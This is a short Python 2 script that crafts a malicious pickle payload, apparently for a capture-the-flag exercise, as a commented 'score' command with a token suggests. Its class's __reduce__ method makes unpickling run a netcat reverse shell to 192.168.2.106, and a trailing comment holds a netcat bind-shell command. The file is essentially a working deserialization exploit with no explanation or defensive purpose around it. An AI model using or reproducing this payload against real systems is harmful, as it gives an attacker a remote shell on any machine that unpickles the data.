import cPickle
import os


class Blah(object):
    def __reduce__(self):
       # return(os.system,("/usr/local/bin/score 5477fae0-6fde-42c7-af14-feddcfd15e53",))
        
        return(os.system,("netcat 192.168.2.106 80 -e /bin/bash",))
b = Blah()
print(cPickle.dumps(b))
#os.system("netcat -c '/bin/bash -i' -l -p 1234" )
